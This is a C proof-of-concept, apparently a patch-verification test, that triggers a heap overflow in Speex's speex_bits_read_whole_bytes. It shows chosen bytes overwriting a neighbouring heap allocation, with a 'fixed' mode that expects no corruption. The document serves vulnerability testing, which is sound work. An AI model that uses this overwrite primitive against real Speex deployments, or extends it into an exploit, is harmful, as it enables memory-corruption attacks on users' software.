/* Plain-allocator adjacency probe (no ASan): shows attacker-chosen bytes
 * landing in a live neighbouring heap allocation, not just redzone.
 * Two successive oversize writes grow nbBits past buf_size so the second
 * write starts at buf+24 and its last 8 bytes reach a 16-byte canary
 * allocation malloc'd immediately after buf. Deliberately does not free
 * either buffer: the first write already touches the canary chunk header. */
#include <speex/speex_bits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFSZ 16

int main(int argc, char **argv)
{
   int fixed = argc > 1 && strcmp(argv[1], "fixed") == 0;
   char *buf = (char *)malloc(BUFSZ);
   char *canary = (char *)malloc(BUFSZ);
   SpeexBits bits;
   char seed[8], p1[16], p2[16];
   int i, changed = 0;

   if (!buf || !canary)
      return 90;
   memset(buf, 0, BUFSZ);
   memset(canary, 0x5a, BUFSZ);
   printf("delta=%td\n", canary - buf);
   if (canary - buf != 32)
      return 3;                 /* allocator layout not as assumed: UNKNOWN */

   speex_bits_init_buffer(&bits, buf, BUFSZ);
   for (i = 0; i < 8; i++)
      seed[i] = (char)(0x11 + i);
   speex_bits_read_whole_bytes(&bits, seed, 8);
   for (i = 0; i < 16; i++)
      p1[i] = (char)('A' + i);
   speex_bits_read_whole_bytes(&bits, p1, 16);   /* first OOB write */
   for (i = 0; i < 16; i++)
      p2[i] = (char)('a' + i);
   speex_bits_read_whole_bytes(&bits, p2, 16);   /* second OOB write */
   printf("nbBits=%d nbytes=%d\n", bits.nbBits, speex_bits_nbytes(&bits));
   printf("canary=");
   for (i = 0; i < BUFSZ; i++)
      printf("%02x", (unsigned char)canary[i]);
   printf("\n");
   for (i = 0; i < BUFSZ; i++)
      if ((unsigned char)canary[i] != 0x5a)
         changed++;
   printf("changed=%d chosen=%d\n", changed,
          memcmp(canary, "ijklmnop", 8) == 0);
   return changed == (fixed ? 0 : 8) &&
          (fixed || memcmp(canary, "ijklmnop", 8) == 0) ? 0 : 1;
}
